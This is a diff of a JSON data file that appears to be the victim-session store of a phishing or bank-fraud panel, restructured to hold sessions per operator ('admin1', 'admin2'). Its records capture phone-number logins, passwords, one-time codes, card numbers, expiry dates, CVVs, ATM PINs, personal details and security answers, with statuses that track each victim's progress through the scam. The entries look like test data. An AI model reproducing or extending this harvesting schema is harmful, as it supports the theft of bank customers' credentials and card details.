@@ -1,23 +1,55 @@
 {
-  "bea9783f-6da3-46c5-b202-323b1b7bd262": {
-    "status": "ATM PIN submitted",
-    "online": true,
-    "onlineStatus": "online",
-    "ip": "::ffff:127.0.0.1",
-    "lastUpdate": 1771598053966,
-    "username": "081-134-4069",
-    "password": "3456",
-    "highlightFields": [
-      "atm_pin"
-    ],
-    "otp": "098887",
-    "card_number": "5078 7210 0099 3565",
-    "expiry": "10/28",
-    "cvv": "397",
-    "name": "Michael Ekpere",
-    "email": "fggfdsaa@aba.com",
-    "dob": "06/25/2025",
-    "address": "26 vision road, off Nwaniba road, Uyo. Akwa Ibom State",
-    "atm_pin": "9876"
+  "admin1": {
+    "publicKey": "43e9fb0b-7ebe-4523-ae18-8946f1c6e571",
+    "totalVisits": 0,
+    "sessions": {
+      "bea9783f-6da3-46c5-b202-323b1b7bd262": {
+        "status": "redirected to personal",
+        "online": false,
+        "onlineStatus": "online",
+        "ip": "::ffff:127.0.0.1",
+        "lastUpdate": 1772105514418,
+        "username": "081-134-4069",
+        "password": "1235",
+        "otp": "214566",
+        "card_number": "5078 7210 0099 3565",
+        "expiry": "10/28",
+        "cvv": "763",
+        "atm_pin": "837488",
+        "name": "Jeremy Doku",
+        "email": "fggfdsaa@aba.com",
+        "dob": "06/25/2025",
+        "address": "Vision rd",
+        "city": "Akwa Ibom",
+        "zipcode": "A1B 2C3",
+        "apartment": "",
+        "phone_number": "081-134-4069",
+        "questions": [
+          {
+            "question": "Where You At",
+            "answer": "Somewhere"
+          },
+          {
+            "question": "Who betide thee",
+            "answer": "Not really"
+          }
+        ]
+      }
+    }
+  },
+  "admin2": {
+    "publicKey": "3abea58b-759a-40a9-b5b3-88f463ed807e",
+    "totalVisits": 0,
+    "sessions": {
+      "bea9783f-6da3-46c5-b202-323b1b7bd262": {
+        "status": "login submitted",
+        "online": true,
+        "onlineStatus": "online",
+        "ip": "::ffff:127.0.0.1",
+        "lastUpdate": 1772133727851,
+        "username": "091-102-1395",
+        "password": "4567"
+      }
+    }
   }
 }
